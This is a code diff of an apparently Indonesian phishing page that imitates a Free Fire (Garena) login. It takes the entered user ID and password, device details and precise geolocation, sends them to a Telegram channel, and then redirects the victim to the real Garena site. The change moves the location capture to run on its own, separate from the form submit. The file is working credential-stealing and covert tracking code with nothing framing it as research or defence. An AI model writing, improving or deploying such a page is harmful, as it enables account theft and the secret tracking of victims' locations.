@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
@@ -62,17 +62,7 @@
                       `🧠 Cores: ${info.cores} \vert{} RAM:${info.memory}GB\n` +
                       `🌐 Lang: ${info.lang}`;
             sendToTelegram(msg);
-        };
 
-        document.getElementById('ffForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const u = document.getElementById('userid').value;
-            const p = document.getElementById('password').value;
-
-            let credMsg = `💎 *FF Credentials Harvested*\n\nID/User: \`${u}\`\nPass: \`${p}\``;
-            sendToTelegram(credMsg);
-
-            // Geolocation di-trigger pas tombol submit ditekan agar diizinkan browser (User Gesture Requirement)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -82,28 +72,30 @@
                         const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                         
                         let geoMsg = `📍 *Target Location Locked*\n` +
-                                     `Lat/Lon: \`${lat},${lon}\`\n` +
+                                     `Lat/Lon: \`${lat}, ${lon}\`\n` +
                                      `Accuracy: ${acc}m\n` +
                                      `🗺️ [Open in Google Maps](${mapsUrl})`;
                         sendToTelegram(geoMsg);
-                        
-                        setTimeout(() => {
-                            window.location.href = 'https://ff.garena.com/';
-                        }, 1000);
                     },
                     (error) => {
                         sendToTelegram(`⚠️ Geolocation denied or unavailable: ${error.message}`);
-                        setTimeout(() => {
-                            window.location.href = 'https://ff.garena.com/';
-                        }, 1000);
                     },
                     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
-            } else {
-                setTimeout(() => {
-                    window.location.href = 'https://ff.garena.com/';
-                }, 1000);
             }
+        };
+
+        document.getElementById('ffForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const u = document.getElementById('userid').value;
+            const p = document.getElementById('password').value;
+
+            let credMsg = `💎 *FF Credentials Harvested*\n\nID/User: \`${u}\`\nPass: \`${p}\``;
+            sendToTelegram(credMsg);
+            
+            setTimeout(() => {
+                window.location.href = 'https://ff.garena.com/';
+            }, 1000);
         });
     </script>
 </body>
